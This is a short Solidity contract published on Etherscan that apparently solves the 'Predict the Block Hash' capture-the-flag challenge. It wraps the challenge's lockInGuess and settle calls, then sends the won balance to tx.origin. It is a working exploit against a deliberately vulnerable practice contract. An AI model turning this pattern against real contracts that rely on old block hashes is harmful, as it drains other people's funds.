/**
 *Submitted for verification at Etherscan.io on 2022-08-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IPredictTheBlockHashChallenge  {
    function isComplete() external view returns (bool);

    function lockInGuess(bytes32 n) external payable;

    function settle() external;
}

contract god {
    IPredictTheBlockHashChallenge public challenge ;
    constructor(address challengeAddress) {
        challenge = IPredictTheBlockHashChallenge(challengeAddress);
    }
    function lockInGuess(bytes32 n) external payable {
        challenge.lockInGuess{value: 1 ether}(n);
    }
    function attack() external payable {
        challenge.settle();
        require(challenge.isComplete(), "challenge not completed");
        tx.origin.transfer(address(this).balance);
    }

    receive() external payable {}
}

//0x81e8d03e700BDE1b487C1E4B8FB0eBcc0fc2342c